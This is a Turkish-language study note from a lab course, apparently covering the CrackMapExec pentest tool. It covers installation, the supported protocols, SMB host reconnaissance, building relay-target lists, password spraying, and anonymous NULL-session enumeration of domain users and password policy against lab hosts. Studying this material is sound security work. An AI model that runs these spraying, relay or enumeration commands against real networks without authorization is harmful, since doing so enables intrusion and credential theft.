---
{"dg-publish":true,"permalink":"/active-directory-expert/deneme-crackmapexec/"}
---



### What is CrackMapExec?

CrackMapExec (diğer adıyla CME), Windows workstation ve sunucularından oluşan büyük ağların güvenliğini değerlendirmeye yardımcı olan bir araçtır.

![Pasted image 20250215115520.png](/img/user/resimler/Pasted%20image%2020250215115520.png)

CME, ağ protokolleriyle çalışmak ve çeşitli exploit sonrası teknikleri gerçekleştirmek için yoğun olarak Impacket kütüphanesini kullanır. CME'nin gücünü anlamak için basit senaryolar hayal etmemiz gerekir:

1. 1.000'den fazla **Windows workstation** ve **server** üzerinde bir **internal security assessment** yürütüyoruz. Sahip olduğumuz **single set of credentials** ile herhangi bir makinede **local administrator** erişimimiz olup olmadığını nasıl test ederiz?
2. Elimizde yalnızca bir **target** ve birden fazla **set of credentials** var, ancak bunların hâlâ geçerli olup olmadığını öğrenmemiz gerekiyor. Bunları hızlıca nasıl test edebiliriz?
3. **Local administrator credentials** elde ettik ve her ele geçirilmiş **workstation** üzerindeki **SAM file**'ı hızlıca **dump** etmek istiyoruz. Bunun için başka bir **tool** mü kullanmalıyız, yoksa her **workstation** üzerinde manuel olarak mı işlem yapmalıyız?


Bu sorular birçok **tool** ve teknik kullanılarak cevaplanabilir, ancak farklı yazarlar tarafından geliştirilen birden fazla **tool** ile çalışmak faydalı olabilir. İşte burada [**CrackMapExec (CME)**](https://github.com/Porchetta-Industries/CrackMapExec) devreye girer ve **internal penetration test** sırasında ihtiyacımız olan küçük işlemleri **automate** etmemize yardımcı olur. **CME**, ayrıca **security assessment** sırasında bulduğumuz **credentials**'ları bir **database** içinde toplar, böylece gerektiğinde bunlara geri dönebiliriz. **Output**, **intuitive** ve **straightforward** olup **tool**, **Linux** ve **Windows** üzerinde çalışır, ayrıca **socks proxy** ve birden fazla **protocol** desteğine sahiptir.

Asıl olarak **offensive purposes** (örn. **internal pentesting**) için kullanılmak üzere tasarlanmış olsa da, **CME**; **blue team** tarafından **account privileges**'ı değerlendirmek, olası **misconfigurations**'ları bulmak ve **attack scenarios**'larını simüle etmek için de kullanılabilir.

Haziran 2021'den beri **CrackMapExec**, yalnızca **[Porchetta](https://porchetta.industries/) platformu** üzerinde güncellenmekte ve **public repository** üzerinde güncellenmemektedir. **Sponsorship**, **[Porchetta](https://porchetta.industries/)** üzerindeki tüm araçlara **altı (6) ay** boyunca erişim sağlamak için **$60** tutarındadır. **Private repository**, her **altı (6) ayda bir** **public repository** ile birleştirilir. Ancak, **community contributions**, herkese anında sunulmaktadır. **CrackMapExec**, [**@byt3bl33d3r**](https://twitter.com/byt3bl33d3r) ve [**@mpgn**](https://twitter.com/mpgn_x64) tarafından geliştirilmektedir. **Official documentation**, [**CrackMapExec Wiki**](https://wiki.porchetta.industries/) üzerinde bulunabilir.

Haziran 2023'te, **mpgn**, **CrackMapExec**'in **lead developer**'ı olarak, **CrackMapExec**'in en son sürümü olan **versiyon 6**'yı içeren yeni bir **repository** oluşturdu, ancak daha sonra bu **repository** kaldırıldı.

Bu araca katkıda bulunan bazı geliştiriciler, projeyi devam ettirmek için bir **fork** oluşturmaya karar verdi. Proje, **NetExec** olarak yeniden adlandırıldı ve şu adreste bulunmaktadır:  
🔗 **[https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)**

**Not:** Bu modülde **CrackMapExec 5.4** sürümünü kullanıyor olsak da, en son güncellemelerle çalışmak için bu yeni **repository**'yi kullanabiliriz:  
🔗 **[https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)**

Şimdi, **CME** aracına genel bir bakış sunduğumuza göre, detaylara girmeden önce onu tercih ettiğimiz **penetration testing system** üzerinde nasıl kuracağımızı ele alalım.



## Installation & Binaries

**CrackMapExec**, **Linux**, **Windows** ve **macOS** ile uyumludur ve ayrıca **Docker** kullanılarak da kurulabilir. Kurulum gerektirmeyen bağımsız **binary** dosyaları da mevcuttur.

Şimdi, **CrackMapExec**'i nasıl kurabileceğimizi inceleyelim.



### Linux Installation

**CrackMapExec** geliştiricileri, bağımlılık ve paket yönetimi için **[Poetry](https://python-poetry.org/docs/)** kullanmayı önermektedir. **Poetry**, **Python** projelerinde bağımlılık yönetimi ve paketleme için kullanılan bir araçtır. Projenizin ihtiyaç duyduğu **kütüphaneleri** tanımlamanıza olanak tanır ve bunları **yükleyip/güncelleyerek** yönetir.

Şimdi, **Poetry**'yi kurmak için [resmi kurulum kılavuzunu](https://python-poetry.org/docs/#installing-with-the-official-installer) takip edelim:


#### Installing Poetry

```
curl -SSL https://install.python-poetry.org | python3 -

Retrieving Poetry metadata
# Welcome to Poetry!
This will download and install the latest version of Poetry,
a dependency and package manager for Python.
It will add the `poetry` command to Poetry's bin directory, located at:
/home/htb-ac35990/.local/bin
You can uninstall at any time by executing this script with the --
uninstall option, and these changes will be reverted.
Installing Poetry (1.2.2): Done
Poetry (1.2.2) is installed now. Great!
You can test that everything is set up by executing the following:
`poetry --version`

```

Sonraki adımda, gerekli **kütüphaneleri** yüklememiz ve **CrackMapExec** deposunu **klonlamamız** gerekiyor. Ayrıca, **RDP protokolü** desteği için artık gerekli olan **Rust**'ı da yüklememiz gerekecek.


#### Installing CrackMapExec Required Libraries

```
sudo apt-get update

sudo apt-get install -y libssl-dev libkrb5-dev libffi-dev python-dev build-essential

<SNIP>

```

CrackMapExec, RDP protokolü için Rust kullanan bir kütüphaneye ihtiyaç duyar. Rust'ı kurmak için şu komutu kullanacağız. Eğer bir uyarı alırsak, `y` yazmamız ve `1.` seçeneği seçmemiz gerekir:


#### Installing Rust

```
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs/ | sh

info: downloading installer
warning: it looks like you have an existing installation of Rust at:
warning: /usr/bin
warning: rustup should not be installed alongside Rust. Please uninstall
your existing Rust first.
warning: Otherwise you may have confusion unless you are careful with your
PATH
warning: If you are sure that you want both rustup and your already
installed Rust
warning: then please reply `y' or `yes' or set RUSTUP_INIT_SKIP_PATH_CHECK
to yes
warning: or pass `-y' to ignore all ignorable checks.
error: cannot install while Rust is installed

Continue? (y/N) y

<SNIP>
Current installation options:
 default host triple: x86_64-unknown-linux-gnu
 default toolchain: stable (default)
 profile: default
 modify PATH variable: yes
1) Proceed with installation (default)
2) Customize installation
3) Cancel installation
>1
<SNIP>

```

Sonraki adımda, terminali kapatmalıyız; aksi takdirde RDP kütüphanesi aardwolf'u kurarken bir hata alırız. Terminali kapattıktan sonra, yeni bir terminal açıp kuruluma devam etmeliyiz.


#### Installing CrackMapExec with Poetry

```
git clone https://github.com/Porchetta-Industries/CrackMapExec
cd CrackMapExec
poetry install

poetry install

Installing dependencies from lock file
Package operations: 94 installs, 0 updates, 0 removals
 • Installing asn1crypto (1.5.1)
 • Installing asysocks (0.2.1)
 • Installing oscrypto (1.3.0)
<SNIP>

```


Şimdi, yeni kurduğumuz CrackMapExec aracını aşağıdaki komutla test edebiliriz:

```
poetry run crackmapexec .
```


#### Running CrackMapExec with Poetry

```
poetry run crackmapexec
poetry run crackmapexec
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter
INTERVAL] [--darrell] [--verbose] {ftp,ssh,winrm,mssql,rdp,ldap,smb} ...
 A swiss army knife for
pentesting networks
 Forged by @byt3bl33d3r and @mpgn_x64
using the powah of dank memes
 Exclusive release for Porchetta
Industries users

https://porchetta.industries/
 Version : 5.4.0
 Codename:
Indestructible G0thm0g
optional arguments:
 -h, --help show this help message and exit
 -t THREADS set how many concurrent threads to use (default:
100)
 --timeout TIMEOUT max timeout in seconds of each thread (default:
None)
 --jitter INTERVAL sets a random delay between each connection
(default: None)
 --Darrell give Darrell a hand
 --verbose enable verbose output
protocols:
 available protocols
 {ftp,ssh,winrm,mssql,rdp,LDAP,smb}
 ftp own stuff using FTP
 ssh own stuff using SSH
 winrm own stuff using WINRM
 mssql own stuff using MSSQL
 rdp own stuff using RDP
 ldap own stuff using LDAP
 smb own stuff using SMB
```


Not: CrackMapExec repository'si güncellenirse ve indirdiğimiz kopyayı Git clone ile güncellemek istersek, CrackMapExec dizinine gidip online repository'den en son değişiklikleri indirmek için `git pull` komutunu kullanabiliriz. Eğer `poetry run` komutunu kullanmadan önce crackmapexec'i çalıştırmak istiyorsak, Poetry virtual environment'ını etkinleştirmek için kurulum dizininde `poetry shell` komutunu çalıştırabiliriz.


### Using Poetry Shell

```
cd CrackMapExec
poetry shell

Spawning shell within /home/htbXXXXXXX/.cache/pypoetry/virtualenvs/crackmapexec-4YDbTJlJ-py3.9

(crackmapexec-py3.9) crackmapexec --help
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter
INTERVAL] [--darrell] [--verbose] {ftp,ldap,mssql,rdp,smb,ssh,winrm} ...
<SNIP>

```

Not: Poetry shell'de olduğumuzu, terminalimizin başında (`crackmapexec-py3.X`) gördüğümüzde anlayabiliriz. Virtual environment'ı devre dışı bırakmak ve bu yeni shell'den çıkmak için `exit` yazabiliriz. Virtual environment'ı shell'den çıkmadan devre dışı bırakmak için ise `deactivate` komutunu kullanabiliriz.


## Installation for Docker

CrackMapExec, Docker uyumlu bir araçtır. GitHub repository'sindeki Dockerfile'ı kullanarak kaynaktan derleyebiliriz.


### Installing Docker using the GitHub repository

```
sudo apt install docker.io
git clone https://github.com/Porchetta-Industries/CrackMapExec -q
cd CrackMapExec
sudo docker build -t crackmapexec .
sudo docker build -t crackmapexec .

Sending build context to Docker daemon 10.38MB
<SNIP>
```


```
sudo docker run -it --entrypoint=/bin/bash --name crackmapexec -v ~/.cme:/root/.cme crackmapexec
root@d46e1e7925dc:/usr/src/crackmapexec/cme# crackmapexec

[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing RDP protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter
INTERVAL] [--darrell] [--verbose] {ftp,ssh,winrm,mssql,rdp,LDAP,smb} ...
 A swiss army knife for
pentesting networks
 Forged by @byt3bl33d3r and @mpgn_x64
using the powah of dank memes
 Exclusive release for Porchetta
Industries users

https://porchetta.industries/
 Version : 5.4.0
 Codename:
Indestructible G0thm0g
<SNIP>

```


Container'dan çıktıktan sonra, aşağıdaki komutla yeniden başlatabiliriz:

### Restart Container

```
sudo docker start crackmapexec
sudo docker exec -it crackmapexec bash
root@dbbda0e6bf72:/usr/src/crackmapexec#
```

Not: Docker repository'si ve yayınlanan binary'ler güncel olmayabilir. Kaynaktan derleme yapmak, en son mevcut sürümü kullandığımızı garanti eder.


### Using Binaries

CrackMapExec'i, önceden derlenmiş ve CrackMapExec GitHub repository'sinde [releases](https://github.com/byt3bl33d3r/CrackMapExec/releases) altında mevcut olan binary'lerle de kullanabiliriz. 

Repository'de iki ana dosya bulacağız: biri cme ile başlayanlar, diğeri ise cmedb ile başlayanlar. cme, CrackMapExec uygulamasına karşılık gelirken, cmedb, CrackMapExec veritabanıyla etkileşimde bulunmamızı sağlayan binary'ye karşılık gelir.  
Bir binary kullanmak istiyorsak, bunu releases bölümünden indirmemiz ve Python'un yüklü olması gerekir. Eğer Windows üzerinde çalışıyorsak ve Python yüklü değilse, [burada](https://www.python.org/downloads/windows/) mevcut olan Python Windows embeddable paketini indirebiliriz, ardından aşağıdaki komutu çalıştırabiliriz:


### Compiled Binaries Windows

```
C:\htb> python.exe cme
<SNIP>
```


Not: Binary'ler Windows, Linux ve MacOS üzerinde de kullanılabilir.  

Windows'ta, yol uzunluğu ile ilgili hatalardan kaçınmak için aşağıdaki Registry key'ini ekleyin:


### Setting Long Path Registry Key

```
C:\> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem" /v LongPathsEnabled /t REG_DWORD /d 1 /f
```

Not: CrackMapExec loglarını ve database'ini `~/.cme` dizinine kaydeder.

Aşağıdaki bölümlerde, CrackMapExec işlevlerini kullanarak Windows ortamlarını enumere edecek ve saldırıya geçeceğiz.


## Targets and Protocols

### Targets Format

Scope'a bağlı olarak, bir engagement sırasında belirli bir aralıktaki bir veya daha fazla hedefi veya önceden tanımlanmış host adlarını tarayabiliriz. CrackMapExec bunu mükemmel bir şekilde yönetebilir. Hedef, bir [CIDR](https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing), bir IP, bir host adı veya IP adreslerini/host adlarını içeren bir dosya adı olabilir.

```
crackmapexec [protocol] 10.10.10.1
crackmapexec [protocol] 10.10.10.1 10.10.10.2 10.10.10.3
crackmapexec [protocol] 10.10.10.1/24
crackmapexec [protocol] internal.local
crackmapexec [protocol] targets.txt
```


### Supported Protocols

CrackMapExec, bir internal security değerlendirmesi sırasında bize yardımcı olmak için tasarlanmıştır. Bu nedenle, Windows ile bağlantılı birden fazla protokolü desteklemesi gerekir. Bu modül yazıldığı sırada, CrackMapExec yedi protokolü desteklemektedir:

| Protocol | Default Port |
| -------- | ------------ |
| SMB      | 445          |
| WINRM    | 5985/5986    |
| MSSQL    | 1433         |
| LDAP     | 389          |
| SSH      | 22           |
| RDP      | 3389         |
| FTP      | 21           |

Mevcut protokolleri doğrulamak için, mevcut seçenekleri ve protokolleri listelemek için `crackmapexec --help` komutunu çalıştırabiliriz.


### Genel Seçenekleri ve Protokolleri Listele

```
crackmapexec --help

usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter
INTERVAL] [--darrell] [--verbose] {ftp,ssh,winrm,mssql,rdp,ldap,smb} ...
 A swiss army knife for
pentesting networks
 Forged by @byt3bl33d3r and @mpgn_x64
using the powah of dank memes
 Exclusive release for Porchetta
Industries users

https://porchetta.industries/
 Version : 5.4.0
 Codename:
Indestructible G0thm0g
optional arguments:
 -h, --help show this help message and exit
 -t THREADS set how many concurrent threads to use (default:
100)
 --timeout TIMEOUT max timeout in seconds of each thread (default:
None)
 --jitter INTERVAL sets a random delay between each connection
(default: None)
 --darrell give Darrell a hand
 --verbose enable verbose output
protocols:
 available protocols
 {ftp,ssh,winrm,mssql,rdp,ldap,smb}
 ftp own stuff using FTP
 ssh own stuff using SSH
 winrm own stuff using WINRM
 mssql own stuff using MSSQL
 rdp own stuff using RDP
 ldap own stuff using LDAP
 smb own stuff using SMB

```


Belirli bir protokolün desteklediği seçenekleri görmek için `crackmapexec <protocol> --help` komutunu çalıştırabiliriz. LDAP'ı örnek olarak görelim:


### LDAP Protokolü ile Kullanılabilen Seçenekleri Görüntülem

```
crackmapexec ldap --help

usage: crackmapexec ldap [-h] [-id CRED_ID [CRED_ID ...]]
 [-u USERNAME [USERNAME ...]]
 [-p PASSWORD [PASSWORD ...]] [-k]
 [--export EXPORT [EXPORT ...]]
 [--aesKey AESKEY [AESKEY ...]] [--kdcHost
KDCHOST]
 [--gfail-limit LIMIT | --ufail-limit LIMIT | --
fail-limit LIMIT]
 [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION
...]]
 [-L] [--options] [--server {http,https}]
 [--server-host HOST] [--server-port PORT]
 [--connectback-host CHOST] [-H HASH [HASH ...]]
 [--no-bruteforce] [--continue-on-success]
 [--port {636,389}] [--no-smb]
 [-d DOMAIN | --local-auth] [--asreproast
ASREPROAST]
 [--kerberoasting KERBEROASTING]
[--trusted-for-delegation] [--password-notrequired]
 [--admin-count] [--users] [--groups]
 [target ...]
positional arguments:
 target the target IP(s), range(s), CIDR(s), hostname(s),
 FQDN(s), file(s) containing a list of targets,
NMap
 XML or .Nessus file(s)
optional arguments:
 -h, --help show this help message and exit
 -id CRED_ID [CRED_ID ...]
 database credential ID(s) to use for
authentication
 -u USERNAME [USERNAME ...]
 username(s) or file(s) containing usernames
 -p PASSWORD [PASSWORD ...]
 password(s) or file(s) containing passwords
 -k, --kerberos Use Kerberos authentication from ccache file
 (KRB5CCNAME)
 --export EXPORT [EXPORT ...]
 Export result into a file, probably buggy
 --aesKey AESKEY [AESKEY ...]
 AES key to use for Kerberos Authentication (128 or
256
 bits)
 --kdcHost KDCHOST FQDN of the domain controller. If omitted it will
use
 the domain part (FQDN) specified in the target
 parameter
 --gfail-limit LIMIT max number of global failed login attempts
 --ufail-limit LIMIT max number of failed login attempts per username
 --fail-limit LIMIT max number of failed login attempts per host
 -M MODULE, --module MODULE
 module to use
 -o MODULE_OPTION [MODULE_OPTION ...]
 module options
 -L, --list-modules list available modules
 --options display module options
 --server {http,https}
 use the selected server (default: https)
 --server-host HOST IP to bind the server to (default: 0.0.0.0)
 --server-port PORT start the server on the specified port
 --connectback-host CHOST
 IP for the remote system to connect back to (default:
 same as server-host)
 -H HASH [HASH ...], --hash HASH [HASH ...]
 NTLM hash(es) or file(s) containing NTLM hashes
 --no-bruteforce No spray when using file for username and password
 (user1 => password1, user2 => password2
 --continue-on-success
 continues authentication attempts even after
successes
 --port {636,389} LDAP port (default: 389)
 --no-smb No smb connection
 -d DOMAIN domain to authenticate to
 --local-auth authenticate locally to each target
Retrevie hash on the remote DC:
 Options to get hashes from Kerberos
 --asreproast ASREPROAST
 Get AS_REP response ready to crack with hashcat
 --kerberoasting KERBEROASTING
 Get TGS ticket ready to crack with hashcat
Retrieve useful information on the domain:
 Options to to play with Kerberos
 --trusted-for-delegation
 Get the list of users and computers with flag
TRUSTED_FOR_DELEGATION
 --password-not-required
 Get the list of users with flag PASSWD_NOTREQD
 --admin-count Get objets that had the value adminCount=1
 --users Enumerate enabled domain users
 --groups Enumerate domain groups

```



### Hedef Seçme ve Protokol Kullanma

Desteklenen birkaç protokol ve her biri için çeşitli seçeneklerle, CrackMapExec'te ustalaşmanın zor olacağını düşünebiliriz. Neyse ki, bir protokol için nasıl çalıştığını anladığımızda, aynı mantık diğer protokoller için de geçerlidir. Örneğin, password spraying tüm protokoller için aynıdır:


### Password Spray Example with WinRm

```
crackmapexec winrm 10.10.10.1 -u users.txt -p password.txt --no-bruteforce --continue-on-success
```

Başka bir protokole karşı password spraying saldırısı gerçekleştirmek istiyorsak, protokolü değiştirmemiz gerekir:

- **`--no-bruteforce`**
    
    - Bu parametre, **bruteforce denemelerini** devre dışı bırakır. Eğer bu parametre kullanılırsa, sadece kullanıcı adı ve şifrenin doğru eşleştiği durumlar kontrol edilir. Yani, şifre denemeleri yapmadan doğrudan kullanıcının geçerli olup olmadığı kontrol edilir. Eğer bu parametre kullanılmasaydı, her kullanıcı ve şifre kombinasyonu denenecekti.

- **`--continue-on-success`**
    
    - Bu parametre, **başarı durumunda işlemi durdurmamayı** sağlar. Eğer doğru bir kullanıcı adı ve şifre kombinasyonu bulunursa, işlem durmaz ve diğer kullanıcılar ve şifreler için de denemelere devam edilir. Bu, hedefte daha fazla kullanıcı hesabı veya farklı şifreler denemek için kullanılır.

### Target Protocols

```
crackmapexec smb 10.10.10.1 [protocol options]
crackmapexec mssql 10.10.10.1 [protocol options]
crackmapexec ldap 10.10.10.1 [protocol options]
crackmapexec ssh 10.10.10.1 [protocol options]
crackmapexec rdp 10.10.10.1 [protocol options]
crackmapexec ftp 10.10.10.1 [protocol options]
```

Bu basit kuralı anladığımızda, CrackMapExec'in gücünün, sunulan tüm seçeneklerle ilgili kullanım kolaylığından kaynaklandığını göreceğiz.


### Export Function

CrackMapExec bir export fonksiyonu ile birlikte gelir, ancak yardım menüsünde gösterildiği gibi hatalıdır. Dışa aktarılacak dosyanın tam yolunu gerektirir:

#### Exporting result CME
 
```
crackmapexec smb 10.10.10.1 [protocol options] --export $(pwd)/export.txt
```

Bir sonraki bölümde, bazı export örneklerini tartışacağız.


### Protocol Modules

CrackMapExec, daha sonra kullanacağımız ve tartışacağımız modülleri destekler. Her protokolün farklı modülleri vardır. Belirtilen protokol için mevcut modülleri görüntülemek için `crackmapexec protocol -L` komutunu çalıştırabiliriz.

**Protokol Tabanlı Listeleme:** Hangi servislerin açık olduğuna dair bilgi verir.


#### LDAP için Mevcut Modülleri Görüntüle

```
crackmapexec ldap -L

[*] MAQ Retrieves the MachineAccountQuota domainlevel attribute
[*] adcs Find PKI Enrollment Services in Active
Directory and Certificate Templates Names
[*] daclread Read and backup the Discretionary Access
Control List of objects. Based on the work of @_nwodtuhs and @BlWasp_. Be
carefull, this module cannot read the DACLS recursively, more explains in
the options.
[*] get-desc-users Get description of the users. May contained
password
[*] get-network
[*] laps Retrieves the LAPS passwords
[*] ldap-checker Checks whether LDAP signing and binding are
required and / or enforced
[*] ldap-signing Check whether LDAP signing is required
[*] subnets Retrieves the different Sites and Subnets of
an Active Directory
[*] user-desc Get user descriptions stored in Active
Directory
[*] whoami Get details of provided user

```



## Basic SMB Reconnaissance

SMB protokolü, bir Windows hedefi üzerinde keşif yapmak için avantajlıdır. Herhangi bir kimlik doğrulaması olmadan, aşağıdaki gibi her türlü bilgiyi alabiliriz:

| IP address                  | Target local name      |
| --------------------------- | ---------------------- |
| Windows version             | Architecture (x86/x64) |
| Fully qualified domain name | SMB signing enabled    |
| SMB version                 |                        |

### SMB Enumeration

```
crackmapexec smb 192.168.133.0/24

SMB 192.168.133.1 445 DESKTOP-DKCQVG2 [*] Windows 10.0 Build
19041 x64 (name:DESKTOP-DKCQVG2) (domain:DESKTOP-DKCQVG2) (signing:False)
(SMBv1:False)

SMB 192.168.133.158 445 WIN-TOE6NQTR989 [*] Windows Server
2016 Datacenter 14393 x64 (name:WIN-TOE6NQTR989)
(domain:inlanefreight.htb) (signing:True) (SMBv1:True)

SMB 192.168.133.157 445 WIN7 [*] Windows 7 Ultimate
7601 Service Pack 1 x64 (name:WIN7) (domain:WIN7) (signing:False)
(SMBv1:True)
```

Bu basit komutla, tarama anında laboratuvarımızdaki tüm canlı hedefleri, domain adı, işletim sistemi sürümü vb. ile birlikte alabiliriz. Çıktıda gördüğümüz gibi, hedef `192.168.133.157`'nin `domain parametresi`, name parametresiyle aynı, yani hedef WIN7, `inlanefreight.htb` domain'ine katılmamış. Buna karşın, `WIN-TOE6NQTR989` hedefi `inlanefreight.htb` domain'ine katılmış.


Ayrıca bir Windows 10, bir Windows Server ve bir Windows 7 host'u da görebiliyoruz. Windows sunucuları genellikle ilginç verilerle dolu zengin hedeflerdir (paylaşımlar, parolalar, web sitesi ve veritabanı yedekleri, vb.) Hepsi Windows'un 64 bit sürümleridir, bu da bunlardan birinde özel bir binary çalıştırmamız gerektiğinde yardımcı olabilir.


### SMB Signing Devre Dışı Olan Tüm Hostları Alma

CrackMapExec, SMB signing'in devre dışı olduğu tüm host'ları çıkartma seçeneğine sahiptir. Bu seçenek, SMBRelay saldırısı gerçekleştirmek için Impacket'ten [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) ile [Responder](https://github.com/lgandx/Responder) kullanmak istediğimizde oldukça kullanışlıdır.

```
crackmapexec smb 192.168.1.0/24 --gen-relay-list

relaylistOutputFilename.txt

SMB 192.168.1.101 445 DC2012A [*] Windows Server
2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True)
(SMBv1:True)

SMB 192.168.1.102 445 DC2012B [*] Windows Server
2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True)
(SMBv1:True)

SMB 192.168.1.111 445 SERVER1 [*] Windows Server
2016 Standard Evaluation 14393 x64 (name:SERVER1) (domain:PACIFIC)
(signing:False) (SMBv1:True)

SMB 192.168.1.117 445 WIN10DESK1 [*] WIN10DESK1 x64
(name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)
<SNIP>

```

```
cat relaylistOutputFilename.txt
192.168.1.111
192.168.1.117
```

#### Signing Disabled - Host Enumeration

Bu komut, ağınızdaki tüm SMB sunucularını tarar ve SMB imzalama (SMB signing) özelliğini devre dışı bırakmış olan sistemleri belirleyerek bunları bir listeye kaydeder. Yani, sadece SMB imzalama devre dışı bırakılmış olan sunucular bu listeye dahil edilir.

**`--gen-relay-list`** parametresi, SMB Signing kapalı olan makinelerin IP adreslerini çıkaran bir "relay listesi" oluşturur. Bu liste daha sonra **SMBRelay** saldırılarında kullanılabilir. Yani, bu listeyi kullanarak, SMB imzalamayı devre dışı bırakmış makinelerde SMB relay saldırısı yapabilirsiniz.

Bu sayede, "Signing" (SMB signing devre dışı bırakılmış) makineleri hedef alırsınız, çünkü bu makinelerde SMB iletişiminde Signing doğrulaması yapılmaz ve dolayısıyla relay saldırılarına daha açıktırlar.


Bu modülün "Stealing Hashes" bölümünde relaying konusunu ele alacağız.

Ayrıca, bu blog yazısı: [_Practical guide to NTLM Relaying in 2017_](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html) da okunmaya değer.


## Exploiting NULL/Anonymous Sessions

[NULL Session](https://en.wikipedia.org/wiki/Null_session), Windows tabanlı bilgisayarlarda bir inter-process communication (IPC) ağ servisine anonim bir bağlantıdır. Bu servis, named pipe bağlantılarına izin vermek üzere tasarlanmış olsa da, saldırganlar tarafından sistem hakkında uzaktan bilgi toplamak için kullanılabilir. 

Bir hedef, özellikle bir domain controller  `NULL Session'a` karşı savunmasızsa, saldırganın geçerli bir domain hesabına sahip olmadan aşağıdaki gibi bilgileri toplamasına izin verebilir:

* Domain users ( --users )
* Domain groups ( --groups )
* Password policy ( --pass-pol )
* Share folders ( --shares )

 Aşağıdaki komutları kullanarak bir domain controller üzerinde deneyelim:

### Enumerating the Password Policy
 
```
crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)

SMB 10.129.203.121 445 DC01 [+] Dumping password
info for domain: INLANEFREIGHT

SMB 10.129.203.121 445 DC01 Minimum password
length: 7

SMB 10.129.203.121 445 DC01 Password history
length: 24

SMB 10.129.203.121 445 DC01 Maximum password age:
41 days 23 hours 53 minutes

SMB 10.129.203.121 445 DC01

SMB 10.129.203.121 445 DC01 Password Complexity
Flags: 000001

SMB 10.129.203.121 445 DC01 Domain Refuse
Password Change: 0

SMB 10.129.203.121 445 DC01 Domain Password
Store Cleartext: 0

SMB 10.129.203.121 445 DC01 Domain Password
Lockout Admins: 0

SMB 10.129.203.121 445 DC01 Domain Password No
Clear Change: 0

SMB 10.129.203.121 445 DC01 Domain Password No
Anon Change: 0

SMB 10.129.203.121 445 DC01 Domain Password
Complex: 1

SMB 10.129.203.121 445 DC01

SMB 10.129.203.121 445 DC01 Minimum password age:
1 day 4 minutes

SMB 10.129.203.121 445 DC01 Reset Account Lockout
Counter: 30 minutes

SMB 10.129.203.121 445 DC01 Locked Account
Duration: 30 minutes

SMB 10.129.203.121 445 DC01 Account Lockout
Threshold: None

SMB 10.129.203.121 445 DC01 Forced Log off Time:
Not Set
```

Bu listeyi dışa aktarmak istiyorsak, `--export [OUTPUT_FULL_FILE_PATH]` komutunu kullanabiliriz. Aşağıdaki örnekte, mevcut yolu kullanmak için `$(pwd)` kullanacağız:


### Exporting Password Policy

```
crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol --export $(pwd)/passpol.txt

...SNIP...
```

Export bir JSON dosyası olacaktır. Dosyayı, tek tırnakları çift tırnaklarla değiştirmek için `sed` komutunu kullanarak formatlayabiliriz ve ardından `jq` uygulamasını kullanarak görüntüleyebiliriz.

### Formating exported file

```
sed -i "s/'/\"/g" passpol.txt
cat passpol.txt | jq
{
 "min_pass_len": 1,
 "pass_hist_len": 24,
 "max_pass_age": "41 days 23 hours 53 minutes ",
 "min_pass_age": "1 day 4 minutes ",
 "pass_prop": "000000",
 "rst_accnt_lock_counter": "30 minutes ",
 "lock_accnt_dur": "30 minutes ",
 "accnt_lock_thres": "None",
 "force_logoff_time": "Not Set"
}
```


### Enumerating Users

```
crackmapexec smb 10.129.203.121 -u '' -p '' --users --export $(pwd)/users.txt

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-] Error enumerating
domain users using dc ip 10.129.203.121: NTLM needs domain\username and a
password
SMB 10.129.203.121 445 DC01 [*] Trying with SAMRPC
protocol
SMB 10.129.203.121 445 DC01 [+] Enumerated domain
user(s)
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Guest Built-in account for
guest access to the computer/domain
SMB 10.129.203.121 445 DC01
inlanefreight.htb\carlos
SMB 10.129.203.121 445 DC01
inlanefreight.htb\grace
SMB 10.129.203.121 445 DC01
inlanefreight.htb\peter
SMB 10.129.203.121 445 DC01 
inlanefreight.htb\alina Account for testing HR
App. Password: HRApp123!
SMB 10.129.203.121 445 DC01
inlanefreight.htb\noemi
SMB 10.129.203.121 445 DC01
inlanefreight.htb\engels Service Account for
testing
SMB 10.129.203.121 445 DC01
inlanefreight.htb\kiosko
SMB 10.129.203.121 445 DC01
inlanefreight.htb\testaccount pwd: Testing123!
SMB 10.129.203.121 445 DC01
inlanefreight.htb\mathew
SMB 10.129.203.121 445 DC01
inlanefreight.htb\svc_mssql
```

Export edilen dosyayı, tüm kullanıcıların bir listesini almak için kullanabiliriz; daha sonra bu listeyi kullanacağız.


### Kullanıcı Listesini Çıkarma

```
sed -i "s/'/\"/g" users.txt
jq -r '.[]' users.txt > userslist.txt
cat userslist.txt
Guest
carlos
grace
peter
alina
noemi
engels
kiosko
testaccount
mathew
svc_mssql
gmsa_adm
belkis
nicole
jorge
linda
shaun
diana
patrick
elieser

```

